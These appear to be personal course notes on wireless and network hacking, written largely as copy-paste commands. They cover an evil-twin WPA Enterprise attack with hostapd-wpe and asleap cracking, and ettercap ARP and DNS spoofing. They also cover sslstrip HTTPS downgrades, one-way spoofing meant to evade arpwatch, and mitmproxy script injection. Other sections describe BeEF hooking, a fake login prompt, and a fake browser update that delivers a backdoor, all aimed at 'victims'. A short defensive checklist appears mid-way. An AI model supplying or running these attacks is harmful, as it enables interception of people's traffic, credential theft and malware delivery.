1. Encryption is used, so can’t sniff credentials in monitor mode.

2. Can’t use ARP spoofing because we need to connect first.

The only solution is to run an evil twin attack, 2 ideas:

1. Using the traditional method, just use a page that looks like login box.

2. Create a fake AP that uses WPA enterprise

Hacking WPA Enterprise

Drawbacks:

1. Has to be an open network when users know their network use WPA/WPA2.

2. They have to enter password in a web page.

Advantages:

● Password is sent in plain text.

● No need to decrypt it.

Using Traditional Fake AP

Hacking WPA Enterprise

Drawbacks:

● Captured password will be encrypted.

Advantages:

● Looks and behaves exactly like a real WPA-Enterprise network.

Using a Fake WPA Enterprise AP

So in wpa/wpa2 psk the traffic is encrypted using the single key, whereas in wpa/wpa2 enterprise it encrypted using each key for each one of userrs.

The router is not handling the authentication process, it forward forward the username and pass to the radius server and it authenticate it.( EAP, EAP FAST, LEAP, TLS are the protocols used by this)

Here when we click connect it ask for a username and password in a login box window. In captive portal it asked in a web page, here it is in a window box.

Let' hack wpa enterprise using fake wpa enterprise Ap:

We can use a traditional fake AP method for this, but it may not fool all users because it create a webpage authentication and wpa enterprice Ap uses a system login box.

So lets try another method :

Let's install a modified version of hostapd called hostapd-wpe, we used hostapd for normal fake ap, hostapd-wpe is specially designed for wpa enterprise.

▶️> apt-get install hostapd-wpe

Now let's modiftt the configuration.

▶️> gedit /etc/hostapd-wpe/hpstapd-wpe.conf

Make sure the interface is correct, modify the ssid to the name we want(set the same name of the target). That's all.

Let's stop the network manager before running the attack : service network-manager stop

▶️> hostapd-wpe /etc/hostpad-wpe/hostpad-wpe.conf

Now it's running, now run a deauthentication attack and they will connect to our network.

When they connect it will automatically ask for username and password in a system login box.

But when they enter usrname and pass we will gget it, but the password will be in encrypted format. We get username as plain text and a challenge and a response. (It uses a challenge response authentication)

(Its encrypted using NETLMTM)

LET'S CRACK IT:

We need to run a dictinory attack, it try each words,then it try to create a responsee based on these words and compare to the real response we get, if the response generated matches with the real response we found the passsword.

There are a number of tools that can run a dictnory attack against netlmtn hashes, here we use asleap tool.

▶️> asleap --help

▶️> asleap -C 08:00:27:c7:e1:36:ff -R 08:00:27:c7:e1:36:08:00:27:c7:e1:36:08:00:27:c7:e1:36 -W /root/wordlist.txt  [ -C is the challenge we got and -R is the response we got. Don't mistake them as mac addresses ]

That's all.


✅️ SECURING FROM THE ABOVE ATTACKS WE DONE
===========================================

1. Captive portals

● Open networks.

● No encryption is used.

● Lots of ways to get in.

Solution:

● Do not use captive portals.

● Use WPA/WPA2 enterprise instead.


2. WEP

● Lots of methods to crack it.

● Even SKA networks can be cracked.

Solution:

● DO NOT USE WEP.

3. WPS

● WPS pin is only 8 digits.

● Can be brute-forced even if the router locks.

● Then it can be used to get the WPA/WPA2 key.

Solution:

● Disable WPS.


4. Advanced Wordlist attacks

● Work against all networks.

● Password can be cracked as long as it’s in the wordlist.

Solution:

● Use long complex password of letters, numbers and symbols.

5. Evill twin attack

● Exploit the users.

● Work against all networks.

Solution:

● Educate the users.

○ Always connect to the right AP.

○ Never enter password in a web interface.

5. Evil-Twin Attacks

SUMMARY
-------

1. Do not use captive portals.

2. Never Use WEP.

3. Disable WPS.

4. Use WPA/WPA2 with a long complex password.

5. Educate users

✅️ POST CONNECTION ATTACKS (work against both wireless and wired networks)
==========================================================================

Ettercap basics:

▶️> gedit /etc/ettercap/etter.conf

Modify the following part:


	#---------------
	#     Linux 
	#---------------

	   #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
	   #redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"

	# pendant for IPv6 - Note that you need iptables v1.4.16 or newer to use IPv6 redirect
	   #redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
	   #redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"

We need to remove all the hashes because we are goonna use iptables. So It Look Like :

	   redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
	   redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"

	# pendant for IPv6 - Note that you need iptables v1.4.16 or newer to use IPv6 redirect
	   redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
	   redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"
[ here we modified both iptables and ip6tables. In tuutorial, modified only iptables because we use only iptables ]

Then we need to modify one thing also:
	[privs]
	ec_uid = 65534                # nobody is the default
	ec_gid = 65534                # nobody is the default
Make this id to 0:
	[privs]
	ec_uid = 0                # nobody is the default
	ec_gid = 0                # nobody is the default
	
▶️> ettercap -Tq  ///  [-Tq is text and quite mode, /// makes the tool run without specifying any targets, so it automatically scan all the hosts]

[ sudo netdiscover -r 192.168.1.0/24 this will also scan for host -  just put for remembering our previous lectures ]

[sudo netdiscover -r 10.0.2.0/24 -PN  (active scan)]  [sudo netdiscover -p -r 10.0.2.0/24 -PN]

Now in ettercap terminal, its an interactive session we can just press h for help and oter options as well.

Let's Do an ARP Spoofing with ettercap:

▶️> ettercap -Tq -M arp:remote -i eth0 /10.20.215.1// /10.20.215.9//[ -M is the mode and -i is our interface to sniff on,  first ip is our gateway or router ip and second one is the victim's ip ]

		[ The other forward slashes have also functions.
		ettercap -Tq -M arp:remote -i eth0 08:00:27:c7:e1:36/10.20.215.1// /10.20.215.9//  - we can put mac like this in that part
		ettercap -Tq -M arp:remote -i eth0 /10.20.215.1/fe80::94d5:d8b1:31e6:cda7/ /10.20.215.9//  - we can specify ipv6 address like this
		ettercap -Tq -M arp:remote -i eth0 /10.20.215.1//ports /10.20.215.9//  - we can specify ports after the last slash
		So every slsh have functions, but for now we use only ipv4 like above. ]

Now it will start sniffing. and capture data.

NOW LET'S SETUP SSLSTRIP MANUALLY TO BYPASS HTTPS:

▶️> apt install sslstrip

What sslstrip does is whenever it sees a https request it changes it to http.

We can use ssl strip in any other situations, not only in arp spoofing, we can downgrade https to http whenever we need.

sslstrip not decrypts the https traffic, its a proxy that conversts https requests to http.

Now, sslstrip runs on port 10000 by default, we need to redirect our traffic that comes to our computer on port 80, because that's the port that usually used by webservers. We want to redirect that packets to sslstrip so that it can analyze it and whenever an https packet comes it can bypass it to http.

For redirection from port 80 to 10000 we are going to use iptables.

▶️> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

[ we added rule to the nat table, so we are using a nat network in my kali, -p is protocol ]

So we modified our iptable to redirect our traffic.

▶️> sslstrip --help

▶️> sslstrip  [ jsut type this and it will start ]

Now our sslstrip is running lets become the man in the middle with arp spoofing:

▶️> ettercap -Tq -M arp:remote -i eth0 -S /10.20.215.1// /10.20.215.9//

[same command as before, just added an -s to specify not create self-signed ssl certificate. Because by default ettercap create self-signed certificate and server them to target whenever they go to an https site, this will actually show a warning to user and sometimes sslstrip also not work with this.]

Now all is set, what will happen is when they go to a website, the connection goes through our computer because we are mitm, and goes to port 80 because 80 is used by webservers and it will redirected to 10000 handled by sslstrip and it downgrades the https to http.(But hsts sites like facebook is still not work with this --- This means browser comes in with preloaded lsit of website that is not allowed to open as http)

TILL NOW THERE IS NO WAY TO BYPASS HSTS, SEARCH EVERYDAY FOR THAT IF THERE IS A MEATHOD.⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️

We can see the captured data in our ettercap terminal.

Once we finsih the attack we need to remove the iptable rules because it may interfear in future.

▶️> iptables -t nat --flush  [ now it will back to the normal state ]

Automatically Arp Spoofing New Clients
--------------------------------------

▶️> ettercap -Tq -M arp:remote -i wlan0 -S ///

This is the normal comman that arp poison the target at the time of running the attack. When a new device connects after we starting our attack they will not be affected.

For fixing that issue ettercap has an auto add plugin to add new clients when they connect.

 press h for available options > there we can see press p for activate a plugin > there we can see our plugin as autoadd > just type its name to activate it.
 
 Now the new clients will be automatically added to host list and arp poisoned.
 

✅️ DNS SPOOFING USING ETTERCAP
------------------------------

We know that dns spoofing does is redirect request from website to another. So we can redirect our victims from one website to any other we want.

▶️> gedit /etc/ettercap/etter.dns

		# Sample hosts file for dns_spoof plugin                                   #
		#                                                                          #
		# the format is (for A query):                                             #
		#   www.myhostname.com A 168.11.22.33 3600                                 #
		#   *.foo.com          A 168.44.55.66 [optional TTL]                       #

This means a request to www.myhostname.com will be redirected to 168.11.22.33 3600  and  *.foo.com means any subdomain.foo.com will be redirected to 168.44.55.66.

We can use our own ip to redirect to our own apache webserver.

So modify the file accordingly.

▶️> ettercap -Tq -M arp:remote -i wlan0 -S -P dns_spoof /10.20.215.9// /10.20.215.1//  [ -p is our plugin name ]

✅️ Bypassing Router-Side Security  Poisoning Target Without Triggering Alarms
-----------------------------------------------------------------------------

If the victim implements any way to detect arp spoofing attack on the router like arpwatch that depend on the arp tables, it will detect that 2 ip have the same mac address.

It may raise an alarm or even disconnect the hacker from the network.

The Only Way To Bypassing It Is The One Way Spoofing.

In one way spoofing we only fools the victim that we are the router.

So what will happen is the victim send request to our computer and we forward it to router because victim thinks we are router, but the response from the router will directly go to the victim, not through our computer, becaause we don't fooled the router.

So with this method we cannot see or modify the responses. We will only capture requests, see the urls, see usernames and pass, run dns spoofing, downgrade https etc. We can't play with the responses.

▶️> ettercap -Tq -M arp:oneway -i wlan0 -S /10.20.215.9// /10.20.215.1//  [ we specified arp in oneway, and first we give victim ip and 2nd ip of the router, because we are only spoofing the flow from target1 to target2, here target1=victim and target2=router ]

Ettercap will sniff data automatically in normal arp spoofing, but in case of oneway spoofing i noticied that some data is missing, so run wireshark along with all these to ccapture all the data and add http to see all http requests.

The Oneway spoofing method can be used to bypass router alarms or detections against arp spoofing so that we dont spoof the router. In normal case we can use normal arp spoofing.

✅️ Post Connection Attacks - Analysing Data Flows  Running Custom Attacks
-------------------------------------------------------------------------

We will use mitmproxy here. The tool comes with 3 types: mitmproxy, mitmweb, mitmdump.
We use mitmweb for better interfaace.

Download mitmproxy from github if it does not installed.

▶️> mitmweb

It will open in browser

By default it runs in explicit mode, this mode the user connects directly to the proxy, we can analyze the data flow in our computer.

We need to configure our browser to connect the proxy and send data to it:

 browser> settings> advanced > network > settings > Click on manual proxy configuration > proxy=our own ip, port=8080 (we get port from the terminal that started mitmweb, it showed listening on 8080)

 Now when we search anything on our browser it will first go to mitmproxy. So only our computer can be analyzed, we will talk later on analyzing other computers.
 
ANALYZING THE DATA IN MITMPROXY
-------------------------------

In the mitmweb web interface we will have 3 input boxes, Search, intercept and highlight options.

If we clicked the search box, there we can see some recommendations also.

eg: we can see ~a its for asses, if we type just ~a it loads all asset files data. We can do ~a .js it loads all javascript data.

    We can see ~m its for method, we can do ~m POST, it shows all post requests.
    
Experiment with all others..

In the highlight input box, we can type the same options or inputs as above in the search box, here it only highlights the data there, in search box we can get the data filtered here it only highlights.


Intercept and edit Network Flows
--------------------------------

There is an intercept option as a input box also, there also we can search for the same inputs/filters as above, in this case it highlights that ones live while in the interception and intercept that packet. We can click that one and we can click resume button to send it.

Eg: We filtered ~m POST in the intercept option, We can see other datas capturing as well, but post requests will be intercepted, we can click on them and it will go to server only if we click resume, otherwise it remains in paused state. So we can pause victim's post request flowing with this technique. We can abort/drop that request as well.

If we put /* in the intercept filter, all the request will be paused and only will be forwarded if we click resume. ( Basicaly it is like burpsuit proxy if you used it in web pentesting)

So we can pause every connection of our target and they can't browse. Let's see how to modify packets and requests.

~s is a filter for showing only responses. (Responses means if we browse facebook.com the webpage of facebook we seen is the response and our request is facebook.com)

Now in the intercept option give ~bs as the filter, it is for intercepting response body. So now all the responses they recieving will be intercepted and paused, we can modify the responses/webpages in the way we want like modifying html code, injecting javascript etc.. and resume the response, so they will see our modified response in their screen.

eg: give intercept filter as ~bs </body> . This will intercept responses with htmls codes with </body> tag in it.

    To edit it click on the packet, click on the edit/pencil icon > before closing the body tag(</body>) try to add a javascript like <script>alert("Hey!! You are hacked");</script> .
    
    Put the js code before closing the body tag and click resume button. 
    
    [ for some reason, if the save button not shows, click on that section and press tab key simulteneously to show, this is just a simple bug occured for me ]
    
    Now It Will Show An Alret Box In Victims Browser. Now we are doing this in our computer because, remember that we starter mitmproxy as in explicit mode that we can see data flow in our own system. Later we will see this doing in   other/victims computer.
    
We configured our browser to use mitmproxy by changing the network proxy settings in our browser and analyzed the data flow, we can't actually do this in our victims browsers. 

Let's run mitmproxy against other computers in our real life scenario.

First become man in the middle using any of the method we learnt, i done it by arp spoofing now.

▶️> ettercap -Tq -M arp:remote -i eth0 -S /10.20.259// /10.20.215.1//  [first target ip and 2nd is the router ip ]

Now we are the man in the middle.

Go to mitm proxy directory if installed from github:

Redirect any data coming to port 80 to the port that mitmproxy runs on. [ this is like we forwarded traffic to sslstrip]

▶️> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

This does what we done in our browser, in this case our victms data will be flowing through our port 80 will be redirected to port 8080 which our mitmproxy is running.

(Like this use own brain and do things in different scenarioes, by this method we can redirect any thing from anywhere to anywhere)

Now we set to redirect the traffic, and now 8080 is inactive, lets start mitmproxy:

▶️> mitmweb --transparent

We typed transparent, erlier we run mitmproxy in explicit mode where we have to configure our browser to use it as a proxy, now no proxy needed, we used by arp spoofing and redirecting data directly to mitmproxy.

Go to the web interface and see the data flow and do all the attacks we done erlier in explicit mode.

[remember to  change back the network proxy settings of browser from manual proxy configuration for mitmproxy to normal state after reserching with explicit mode]

▶️> iptables -t nat --flush  [after the attack do this to revert our iptables back to normal state]

Editing Responses  Injecting BeEFs Code On The Fly
--------------------------------------------------
	
Let's hook the target to beef:
	
Run beef > copy the example code given in beef terminal to hook the victim > We actually injeccted an alert box in previous session, like that add the beef code also. That's all.
	
[But note that in the script change the src url ip to our own ip.]

	
Now we intercepted, modified, and even hooked the target to beef, but all we done is manualy intercepting and editing th ecode and then resuming the request. But this takes some time and slows down the connection of target which is not so good. So now let's do this automatically:
	
Editing Responses Automatically Based On Regex (Regex means teh rule or the filter we using eg: ~bs)
	
----------------------------------------------
Let's use mitmdump that comes with mitmproxy to doo this.
	
▶️> mitmdump --transparent --replace :~s:"</body>":"<script>alert("hii")</script></body>"

[ we used ~s to filter response body because mitmdump  has no filter as ~bs, its simply ~s here ]

So ther is 3 colons (:::). Between the 1st section put the filter/regex, between the 2nd colon put the data we looking for...here we're looking for </body> tag, after the last colon put the data that we want to replace the </body> with.

In the manual method we added our script before  the </body>, but here if we only put the script after the colon it modifies the </body> tag with the script we give, so we need to put the  </body> tag also.

We can also add or inject backdoors like this, so once we know the methods the possibilities are endless.

Bonus - Stealing Login Info Using Fake Login Prompt using beef
--------------------------------------------------------------

Beef is not actually a network hacking tool, but we can use it likely we done in the previous attacks.

We can do alert to send an alert, spider eye to take a screen shot, redirect browser to redirect to any website we want, pretty theft to do a phishing like attack that popups a fake login box of social media accounts saying that session timeout please login again. All these modules command can get with the search option in beef, jsut search for the above plugins.

Bonus - Hacking Windows 10 Using A Fake Update
----------------------------------------------

We can show that your browser is out of date and update, and when they download it will be our trojan.

It will actually update the browser for real, and also run our backdoor in the background.


Go to beef web interface > social engineering > clippy > in the clippy image dir option modify only the ip address to our own ip > in the executable file give our backdoor.exe file with our ip


✅️ BUILDING  AN ATTACK ATTACK STATERGY
=======================================

Let's  assume we are the mitm and we are using mitmweb to analyze data, when a user clicks download a file we can see that also, normal thing. But assume we filtered .exe in the intercept section and it paused the reques (.exe or any other filename we can filter) then if we click that request we can see the data, actually in the response body the binary or hex code we seeing is the actual file (like in burpsuit), we can just replace/edit that code with our binary/hex code of a backdoor. Some times it may crash, that's just one way of replacing the code just like we replaced the html codee. BUT WE NEED TO REPLACE IT USING SCRIPTS. Another method is, insted of editing/replacing the response body binary codes, we can replace the whole response with our own created response. we need a script for that also.

mitmproxy does not support this type of scripts, but mitmproxy has an API that we caan use to create our own scripts. [ python + mitmproxy api = more powerful scripts ]

[http://docs.mitmproxy.org/en/stable/scripting/overview.html]


NOW THAT WE ALMOST DONE WITH THIS. FROM NOW ON THERE ARE SOME SIPTIG TUTORIALS THAT YOU CAN WRITE YOUR OWN PYTHON SCRIPTS FOR NETWORK HACKING. BUT I AM NOT COVERING THAT HERE.

FOR NOW CONSIDER IT AS AN END, I WILL UPLOAD THE SCRIPTING TUTORIAL AS AN ANOTHER REPO.

SO BY THIS END YOU SHOULD PROBABLY ABLE TO LAUNCH ATTACK AGAINST NETWORK EXACTLY LIKE BLACKHAT HACKERS, AND YOU CAN CONFIDENTLY SAY YOU ARE NOT A SCRIPT KIDDIE BECAUSE YOU KNOW ALL THE MANUAL METHODS TO DO IT.

SO THANK YOU FOR EVERYONE, AND JUST HIT THE STAR ALSO.







JUST A SIMPLE BONUS
-----------------------

SINIFFING DATA WITH WIRESHARK
------------------------------

We need to calculate psk first.

https://www.wireshark.org/tools/wpa-psk.html

Go to this link and put ssid and password there to generate the psk. copy that.

Open wireshark > preferences > protocols > IEEE 802.11 > enable decryption. > Decryption key = paste the psk that we copied from the site and type = wpa-psk.

Type dns in the filter section and there you go. try different filters like http.

Type eapol in filter to show info when a new device connects.

( Bettercap tutorial : https://youtu.be/2J3idGxCbuc )
